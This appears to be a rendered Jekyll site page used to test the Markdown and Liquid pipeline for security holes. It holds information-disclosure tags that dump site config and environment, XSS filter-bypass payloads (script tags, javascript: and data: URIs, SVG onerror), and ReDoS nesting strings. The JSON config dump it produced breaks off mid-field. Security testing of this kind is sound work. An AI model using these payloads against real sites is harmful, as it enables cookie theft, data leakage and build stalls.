1. Information Disclosure / Context Leak Tests

Check if the following tags render raw system strings, tokens, or environment details when viewed on the live platform:

  • Global Site Objects: { &quot;tags&quot;: {}, &quot;config&quot;: null, &quot;data&quot;: {}, &quot;static_files&quot;: [ { &quot;modified_time&quot;: &quot;2026-06-20 12:09:00 +0530&quot;, &quot;name&quot;: &quot;conisoluri.md&quot;, &quot;path&quot;: &quot;/conisoluri.md&quot;, &quot;collection&quot;: null, &quot;basename&quot;: &quot;conisoluri&quot;, &quot;extname&quot;: &quot;.md&quot; }, { &quot;modified_time&quot;: &quot;2026-06-20 11:47:46 +0530&quot;, &quot;name&quot;: &quot;fullresponse.txt&quot;, &quot;path&quot;: &quot;/fullresponse.txt&quot;, &quot;collection&quot;: null, &quot;basename&quot;: &quot;fullresponse&quot;, &quot;extname&quot;: &quot;.txt&quot; }, { &quot;modified_time&quot;: &quot;2026-06-20 12:35:59 +0530&quot;, &quot;name&quot;: &quot;multitenant.txt&quot;, &quot;path&quot;: &quot;/multitenant.txt&quot;, &quot;collection&quot;: null, &quot;basename&quot;: &quot;multitenant&quot;, &quot;extname&quot;: &quot;.txt&quot; }, { &quot;modified_time&quot;: &quot;2026-06-20 12:17:02 +0530&quot;, &quot;name&quot;: &quot;redos.md&quot;, &quot;path&quot;: &quot;/redos.md&quot;, &quot;collection&quot;: null, &quot;basename&quot;: &quot;redos&quot;, &quot;extname&quot;: &quot;.md&quot; }, { &quot;modified_time&quot;: &quot;2026-06-20 12:14:46 +0530&quot;, &quot;name&quot;: &quot;secret&quot;, &quot;path&quot;: &quot;/secret&quot;, &quot;collection&quot;: null, &quot;basename&quot;: &quot;secret&quot;, &quot;extname&quot;: &quot;&quot; } ], &quot;categories&quot;: {}, &quot;collections&quot;: [ { &quot;files&quot;: [], &quot;directory&quot;: &quot;/home/loca/testgit/_posts&quot;, &quot;relative_directory&quot;: &quot;_posts&quot;, &quot;docs&quot;: [], &quot;output&quot;: true, &quot;label&quot;: &quot;posts&quot;, &quot;permalink&quot;: &quot;/:categories/:year/:month/:day/:title:output_ext&quot; } ], &quot;html_pages&quot;: [ &quot;\n&quot;, &quot;## 1. Information Disclosure / Context Leak Tests\n\nCheck if the following tags render raw system strings, tokens, or environment details when viewed on the live platform:\n\n* **Global Site Objects:** {{ site | inspect }}\n* **GitHub Metadata Dump:** {{ site.github | json }}\n* **Environment Verification:** {{ site.env | inspect }}\n* **Pages Collection Metadata:** {{ site.pages | inspect }}\n\n---\n\n## 2. Cross-Site Scripting (XSS) / Filter Bypasses\n\n### Standard Script Tags\n&lt;script&gt;alert(document.domain)&lt;/script&gt;\n\n### URI Handler Scheme\n[Execute Test Payload](javascript:alert(document.cookie))\n\n&lt;a href=\&quot;javascript:alert(1)\&quot;&gt;Raw Anchor Link Test&lt;/a&gt;\n\n---\n\n## 3. Namespace Confusion via SVG foreignObject\n\nThis test checks if the Markdown sanitizer scans inside embedded XML schemas. If successful, the image tag inside the XHTML body wrapper will execute.\n\n&lt;svg width=\&quot;200\&quot; height=\&quot;100\&quot;&gt;\n &lt;foreignObject width=\&quot;200\&quot; height=\&quot;100\&quot;&gt;\n &lt;body xmlns=\&quot;http://www.w3.org/1999/xhtml\&quot;&gt;\n &lt;img src=\&quot;does-not-exist.jpg\&quot; onerror=\&quot;alert(&apos;XSS-via-foreignObject&apos;)\&quot;&gt;\n &lt;/body&gt;\n &lt;/foreignObject&gt;\n&lt;/svg&gt;\n\n---\n\n## 4. Deep Parser Stress Tests (ReDoS / Pipeline Timeout)\n\nThese strings test if the platform&apos;s backend implementation of Kramdown handles deeply recursive nesting safely or if it stalls the build process.\n\n&gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; Deep Blockquote Nesting\n\n[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[Deep Bracket Nesting]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]\n&quot;, &quot;DUMP_START\n{{ site | inspect }}\n{{ site.github | json }}\n{{ ENV | inspect }}\nDUMP_END\n&quot;, &quot;&quot;, &quot;&lt;svg width=\&quot;500\&quot; height=\&quot;500\&quot; xmlns=\&quot;http://www.w3.org/2000/svg\&quot;&gt;\n &lt;foreignObject width=\&quot;100%\&quot; height=\&quot;100%\&quot;&gt;\n &lt;div xmlns=\&quot;http://www.w3.org/1999/xhtml\&quot;&gt;\n &lt;img src=\&quot;x\&quot; onerror=\&quot;alert(&apos;Local-Test&apos;)\&quot;&gt;\n &lt;/div&gt;\n &lt;/foreignObject&gt;\n&lt;/svg&gt;\n&quot;, &quot;## Math Parsing Behavior\n$$\\alpha + \\beta = \\chi &lt;script&gt;alert(1)&lt;/script&gt;$$\n\n## Link Schema Behavior\n[Standard Verification Link](javascript:alert(document.domain))\n\n$$\\alpha + \\beta = \\chi &lt;script&gt;alert(document.domain)&lt;/script&gt;$$\n\n$$\\underline{\\text{&lt;img src=x onerror=alert(1)&gt;}}$$\n\n$$\\msghash = \\text{\&quot;hello\&quot; \\color{red}{\\cancel{\\text{XSS Payload}}}}$$\n&quot;, &quot;[Click for Content Verification](javascript:alert(document.domain))\n\n[Bypass Variant 2](javascript://%0d%0aalert(1))\n\n[Bypass Variant 3](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)\n&quot;, &quot;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; Deep Nesting Stalling Test\n\n[*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*x*]\n\n[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[STALL]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]\n&quot; ], &quot;pages&quot;: [ &quot;\n&quot;, &quot;## 1. Information Disclosure / Context Leak Tests\n\nCheck if the following tags render raw system strings, tokens, or environment details when viewed on the live platform:\n\n* **Global Site Objects:** {{ site | inspect }}\n* **GitHub Metadata Dump:** {{ site.github | json }}\n* **Environment Verification:** {{ site.env | inspect }}\n* **Pages Collection Metadata:** {{ site.pages | inspect }}\n\n---\n\n## 2. Cross-Site Scripting (XSS) / Filter Bypasses\n\n### Standard Script Tags\n&lt;script&gt;alert(document.domain)&lt;/script&gt;\n\n### URI Handler Scheme\n[Execute Test Payload](javascript:alert(document.cookie))\n\n&lt;a href=\&quot;javascript:alert(1)\&quot;&gt;Raw Anchor Link Test&lt;/a&gt;\n\n---\n\n## 3. Namespace Confusion via SVG foreignObject\n\nThis test checks if the Markdown sanitizer scans inside embedded XML schemas. If successful, the image tag inside the XHTML body wrapper will execute.\n\n&lt;svg width=\&quot;200\&quot; height=\&quot;100\&quot;&gt;\n &lt;foreignObject width=\&quot;200\&quot; height=\&quot;100\&quot;&gt;\n &lt;body xmlns=\&quot;http://www.w3.org/1999/xhtml\&quot;&gt;\n &lt;img src=\&quot;does-not-exist.jpg\&quot; onerror=\&quot;alert(&apos;XSS-via-foreignObject&apos;)\&quot;&gt;\n &lt;/body&gt;\n &lt;/foreignObject&gt;\n&lt;/svg&gt;\n\n---\n\n## 4. Deep Parser Stress Tests (ReDoS / Pipeline Timeout)\n\nThese strings test if the platform&apos;s backend implementation of Kramdown handles deeply recursive nesting safely or if it stalls the build process.\n\n&gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; Deep Blockquote Nesting\n\n[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[Deep Bracket Nesting]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]\n&quot;, &quot;DUMP_START\n{{ site | inspect }}\n{{ site.github | json }}\n{{ ENV | inspect }}\nDUMP_END\n&quot;, &quot;&quot;, &quot;&lt;svg width=\&quot;500\&quot; height=\&quot;500\&quot; xmlns=\&quot;http://www.w3.org/2000/svg\&quot;&gt;\n &lt;foreignObject width=\&quot;100%\&quot; height=\&quot;100%\&quot;&gt;\n &lt;div xmlns=\&quot;http://www.w3.org/1999/xhtml\&quot;&gt;\n &lt;img src=\&quot;x\&quot; onerror=\&quot;alert(&apos;Local-Test&apos;)\&quot;&gt;\n &lt;/div&gt;\n &lt;/foreignObject&gt;\n&lt;/svg&gt;\n&quot;, &quot;## Math Parsing Behavior\n$$\\alpha + \\beta = \\chi &lt;script&gt;alert(1)&lt;/script&gt;$$\n\n## Link Schema Behavior\n[Standard Verification Link](javascript:alert(document.domain))\n\n$$\\alpha + \\beta = \\chi &lt;script&gt;alert(document.domain)&lt;/script&gt;$$\n\n$$\\underline{\\text{&lt;img src=x onerror=alert(1)&gt;}}$$\n\n$$\\msghash = \\text{\&quot;hello\&quot; \\color{red}{\\cancel{\\text{XSS Payload}}}}$$\n&quot;, &quot;[Click for Content Verification](javascript:alert(document.domain))\n\n[Bypass Variant 2](javascript://%0d%0aalert(1))\n\n[Bypass Variant 3](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)\n&quot;, &quot;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; Deep Nesting Stalling Test\n\n[*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*x*]\n\n[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[STALL]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]\n&quot;, &quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;UTF-8\&quot;?&gt;\n{% if page.xsl %}&lt;?xml-stylesheet type=\&quot;text/xsl\&quot; href=\&quot;{{ \&quot;/sitemap.xsl\&quot; | absolute_url }}\&quot;?&gt;\n{% endif %}&lt;urlset xmlns:xsi=\&quot;http://www.w3.org/2001/XMLSchema-instance\&quot; xsi:schemaLocation=\&quot;http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd\&quot; xmlns=\&quot;http://www.sitemaps.org/schemas/sitemap/0.9\&quot;&gt;\n{% assign collections = site.collections | where_exp:&apos;collection&apos;,&apos;collection.output != false&apos; %}{% for collection in collections %}{% assign docs = collection.docs | where_exp:&apos;doc&apos;,&apos;doc.sitemap != false&apos; %}{% for doc in docs %}&lt;url&gt;\n&lt;loc&gt;{{ doc.url | replace:&apos;/index.html&apos;,&apos;/&apos; | absolute_url | xml_escape }}&lt;/loc&gt;\n{% if doc.last_modified_at or doc.date %}&lt;lastmod&gt;{{ doc.last_modified_at | default: doc.date | date_to_xmlschema }}&lt;/lastmod&gt;\n{% endif %}&lt;/url&gt;\n{% endfor %}{% endfor %}{% assign pages = site.html_pages | where_exp:&apos;doc&apos;,&apos;doc.sitemap != false&apos; | where_exp:&apos;doc&apos;,&apos;doc.url != \&quot;/404.html\&quot;&apos; %}{% for page in pages %}&lt;url&gt;\n&lt;loc&gt;{{ page.url | replace:&apos;/index.html&apos;,&apos;/&apos; | absolute_url | xml_escape }}&lt;/loc&gt;\n{% if page.last_modified_at %}&lt;lastmod&gt;{{ page.last_modified_at | date_to_xmlschema }}&lt;/lastmod&gt;\n{% endif %}&lt;/url&gt;\n{% endfor %}{% assign static_files = page.static_files | where_exp:&apos;page&apos;,&apos;page.sitemap != false&apos; | where_exp:&apos;page&apos;,&apos;page.name != \&quot;404.html\&quot;&apos; %}{% for file in static_files %}&lt;url&gt;\n&lt;loc&gt;{{ file.path | replace:&apos;/index.html&apos;,&apos;/&apos; | absolute_url | xml_escape }}&lt;/loc&gt;\n&lt;lastmod&gt;{{ file.modified_time | date_to_xmlschema }}&lt;/lastmod&gt;\n&lt;/url&gt;\n{% endfor %}&lt;/urlset&gt;\n&quot;, &quot;Sitemap: {{ \&quot;sitemap.xml\&quot; | absolute_url }}\n&quot;, &quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;utf-8\&quot;?&gt;{% if page.xsl %}&lt;?xml-stylesheet type=\&quot;text/xml\&quot; href=\&quot;{{ &apos;/feed.xslt.xml&apos; | absolute_url }}\&quot;?&gt;{% endif %}&lt;feed xmlns=\&quot;http://www.w3.org/2005/Atom\&quot; {% if site.lang %}xml:lang=\&quot;{{ site.lang }}\&quot;{% endif %}&gt;&lt;generator uri=\&quot;https://jekyllrb.com/\&quot; version=\&quot;{{ jekyll.version }}\&quot;&gt;Jekyll&lt;/generator&gt;&lt;link href=\&quot;{{ page.url | absolute_url }}\&quot; rel=\&quot;self\&quot; type=\&quot;application/atom+xml\&quot; /&gt;&lt;link href=\&quot;{{ &apos;/&apos; | absolute_url }}\&quot; rel=\&quot;alternate\&quot; type=\&quot;text/html\&quot; {% if site.lang %}hreflang=\&quot;{{ site.lang }}\&quot; {% endif %}/&gt;&lt;updated&gt;{{ site.time | date_to_xmlschema }}&lt;/updated&gt;&lt;id&gt;{{ page.url | absolute_url | xml_escape }}&lt;/id&gt;{% assign title = site.title | default: site.name %}{% if page.collection != \&quot;posts\&quot; %}{% assign collection = page.collection | capitalize %}{% assign title = title | append: \&quot; | \&quot; | append: collection %}{% endif %}{% if page.category %}{% assign category = page.category | capitalize %}{% assign title = title | append: \&quot; | \&quot; | append: category %}{% endif %}{% if title %}&lt;title type=\&quot;html\&quot;&gt;{{ title | smartify | xml_escape }}&lt;/title&gt;{% endif %}{% if site.description %}&lt;subtitle&gt;{{ site.description | xml_escape }}&lt;/subtitle&gt;{% endif %}{% if site.author %}&lt;author&gt;&lt;name&gt;{{ site.author.name | default: site.author | xml_escape }}&lt;/name&gt;{% if site.author.email %}&lt;email&gt;{{ site.author.email | xml_escape }}&lt;/email&gt;{% endif %}{% if site.author.uri %}&lt;uri&gt;{{ site.author.uri | xml_escape }}&lt;/uri&gt;{% endif %}&lt;/author&gt;{% endif %}{% if page.tags %}{% assign posts = site.tags[page.tags] %}{% else %}{% assign posts = site[page.collection] %}{% endif %}{% if page.category %}{% assign posts = posts | where: \&quot;categories\&quot;, page.category %}{% endif %}{% unless site.show_drafts %}{% assign posts = posts | where_exp: \&quot;post\&quot;, \&quot;post.draft != true\&quot; %}{% endunless %}{% assign posts = posts | sort: \&quot;date\&quot; | reverse %}{% assign posts_limit = site.feed.posts_limit | default: 10 %}{% for post in posts limit: posts_limit %}&lt;entry{% if post.lang %}{{\&quot; \&quot;}}xml:lang=\&quot;{{ post.lang }}\&quot;{% endif %}&gt;{% assign post_title = post.title | smartify | strip_html | normalize_whitespace | xml_escape %}&lt;title type=\&quot;html\&quot;&gt;{{ post_title }}&lt;/title&gt;&lt;link href=\&quot;{{ post.url | absolute_url }}\&quot; rel=\&quot;alternate\&quot; type=\&quot;text/html\&quot; title=\&quot;{{ post_title }}\&quot; /&gt;&lt;published&gt;{{ post.date | date_to_xmlschema }}&lt;/published&gt;&lt;updated&gt;{{ post.last_modified_at | default: post.date | date_to_xmlschema }}&lt;/updated&gt;&lt;id&gt;{{ post.id | absolute_url | xml_escape }}&lt;/id&gt;{% assign excerpt_only = post.feed.excerpt_only | default: site.feed.excerpt_only %}{% unless excerpt_only %}&lt;content type=\&quot;html\&quot; xml:base=\&quot;{{ post.url | absolute_url | xml_escape }}\&quot;&gt;&lt;![CDATA[{{ post.content | strip }}]]&gt;&lt;/content&gt;{% endunless %}{% assign post_author = post.author | default: post.authors[0] | default: site.author %}{% assign post_author = site.data.authors[post_author] | default: post_author %}{% assign post_author_email = post_author.email | default: nil %}{% assign post_author_uri = post_author.uri | default: nil %}{% assign post_author_name = post_author.name | default: post_author %}&lt;author&gt;&lt;name&gt;{{ post_author_name | default: \&quot;\&quot; | xml_escape }}&lt;/name&gt;{% if post_author_email %}&lt;email&gt;{{ post_author_email | xml_escape }}&lt;/email&gt;{% endif %}{% if post_author_uri %}&lt;uri&gt;{{ post_author_uri | xml_escape }}&lt;/uri&gt;{% endif %}&lt;/author&gt;{% if post.category %}&lt;category term=\&quot;{{ post.category | xml_escape }}\&quot; /&gt;{% elsif post.categories %}{% for category in post.categories %}&lt;category term=\&quot;{{ category | xml_escape }}\&quot; /&gt;{% endfor %}{% endif %}{% for tag in post.tags %}&lt;category term=\&quot;{{ tag | xml_escape }}\&quot; /&gt;{% endfor %}{% assign post_summary = post.description | default: post.excerpt %}{% if post_summary and post_summary != empty %}&lt;summary type=\&quot;html\&quot;&gt;&lt;![CDATA[{{ post_summary | strip_html | normalize_whitespace }}]]&gt;&lt;/summary&gt;{% endif %}{% assign post_image = post.image.path | default: post.image %}{% if post_image %}{% unless post_image contains \&quot;://\&quot; %}{% assign post_image = post_image | absolute_url %}{% endunless %}&lt;media:thumbnail xmlns:media=\&quot;http://search.yahoo.com/mrss/\&quot; url=\&quot;{{ post_image | xml_escape }}\&quot; /&gt;&lt;media:content medium=\&quot;image\&quot; url=\&quot;{{ post_image | xml_escape }}\&quot; xmlns:media=\&quot;http://search.yahoo.com/mrss/\&quot; /&gt;{% endif %}&lt;/entry&gt;{% endfor %}&lt;/feed&gt;&quot; ], &quot;time&quot;: &quot;2026-06-20 12:35:59 +0530&quot;, &quot;posts&quot;: [], &quot;documents&quot;: [], &quot;related_posts&quot;: null, &quot;source&quot;: &quot;/home/loca/testgit&quot;, &quot;destination&quot;: &quot;/home/loca/testgit/_site&quot;, &quot;collections_dir&quot;: &quot;&quot;, &quot;plugins_dir&quot;: &quot;1e1e93b38f87aa090d3ee938838d132f&quot;, &quot;layouts_dir&quot;: &quot;_layouts&quot;, &quot;data_dir&quot;: &quot;_data&quot;, &quot;includes_dir&quot;: &quot;_includes&quot;, &quot;safe&quot;: true, &quot;include&quot;: [ &quot;.htaccess&quot; ], &quot;exclude&quot;: [ &quot;Gemfile&quot;, &quot;Gemfile.lock&quot;, &quot;node_modules&quot;, &quot;vendor/bundle/&quot;, &quot;vendor/cache/&quot;, &quot;vendor/gems/&quot;, &quot;vendor/ruby/&quot;, &quot;CNAME&quot; ], &quot;keep_files&quot;: [ &quot;.git&quot;, &quot;.svn&quot; ], &quot;encoding&quot;: &quot;utf-8&quot;, &quot;markdown_ext&quot;: &quot;markdown,mkdown,mkdn,mkd,md&quot;, &quot;strict_front_matter&quot;: false, &quot;show_drafts&quot;: null, &quot;limit_posts&quot;: 0, &quot;future&quot;: false, &quot;unpublished&quot;: false, &quot;whitelist&quot;: [ &quot;jekyll-coffeescript&quot;, &quot;jekyll-commonmark-ghpages&quot;, &quot;jekyll-feed&quot;, &quot;jekyll-gist&quot;, &quot;jekyll-github-metadata&quot;, &quot;jekyll-paginate&quot;, &quot;jekyll-redirect-from&quot;, &quot;jekyll-seo-tag&quot;, &quot;jekyll-sitemap&quot;, &quot;jekyll-avatar&quot;, &quot;jemoji&quot;, &quot;jekyll-mentions&quot;, &quot;jekyll-relative-links&quot;, &quot;jekyll-optional-front-matter&quot;, &quot;jekyll-readme-index&quot;, &quot;jekyll-default-layout&quot;, &quot;jekyll-titles-from-headings&quot;, &quot;jekyll-include-cache&quot;, &quot;jekyll-octicons&quot;, &quot;jekyll-remote-theme&quot;, &quot;jekyll-admin&quot; ], &quot;plugins&quot;: [ &quot;jekyll-sitemap&quot;, &quot;jekyll-feed&quot;, &quot;jekyll-coffeescript&quot;, &quot;jekyll-commonmark-ghpages&quot;, &quot;jekyll-gist&quot;, &quot;jekyll-github-metadata&quot;, &quot;jekyll-paginate&quot;, &quot;jekyll-relative-links&quot;, &quot;jekyll-optional-front-matter&quot;, &quot;jekyll-readme-index&quot;, &quot;jekyll-default-layout&quot;, &quot;jekyll-titles-from-headings&quot;, &quot;jekyll-remote-theme&quot; ], &quot;markdown&quot;: &quot;kramdown&quot;, &quot;highlighter&quot;: &quot;rouge&quot;, &quot;lsi&quot;: false, &quot;excerpt_separator&quot;: &quot;\n\n&quot;, &quot;incremental&quot;: false, &quot;detach&quot;: false, &quot;port&quot;: &quot;4000&quot;, &quot;host&quot;: &quot;127.0.0.1&quot;, &quot;baseurl&quot;: null, &quot;show_dir_listing&quot;: false, &quot;permalink&quot;: &quot;date&quot;, &quot;paginate_path&quot;: &quot;/page:num&quot;, &quot;timezone&quot;: null, &quot;quiet&quot;: false, &quot;verbose&quot;: false, &quot;defaults&quot;: [], &quot;liquid&quot;: { &quot;error_mode&quot;: &quot;warn&quot;, &quot;strict_filters&quot;: false, &quot;strict_variables&quot;: false }, &quot;rdiscount&quot;: { &quot;extensions&quot;: [] }, &quot;redcarpet&quot;: { &quot;extensions&quot;: [] }, &quot;kramdown&quot;: { &quot;auto_ids&quot;: true, &quot;toc_levels&quot;: &quot;1..6&quot;, &quot;entity_output&quot;: &quot;as_char&quot;, &quot;smart_quotes&quot;: &quot;lsquo,rsquo,ldquo,rdquo&quot;, &quot;input&quot;: &quot;GFM&quot;, &quot;hard_wrap&quot;: false, &quot;guess_lang&quot;: true, &quot;footnote_nr&quot;: 1, &quot;show_warnings&quot;: false, &quot;gfm_quirks&quot;: &quot;paragraph_end&quot;, &quot;syntax_highlighter_opts&quot;: { &quot;default_lang&quot;: &quot;plaintext&quot;, &quot;guess_lang&quot;: true }, &quot;math_engine&quot;: 2. Cross-Site Scripting (XSS) / Filter Bypasses

Standard Script Tags

URI Handler Scheme

Execute Test Payload

Raw Anchor Link Test

3. Namespace Confusion via SVG foreignObject

This test checks if the Markdown sanitizer scans inside embedded XML schemas. If successful, the image tag inside the XHTML body wrapper will execute.

4. Deep Parser Stress Tests (ReDoS / Pipeline Timeout)

These strings test if the platform’s backend implementation of Kramdown handles deeply recursive nesting safely or if it stalls the build process.

Deep Blockquote Nesting

[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[Deep Bracket Nesting]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]
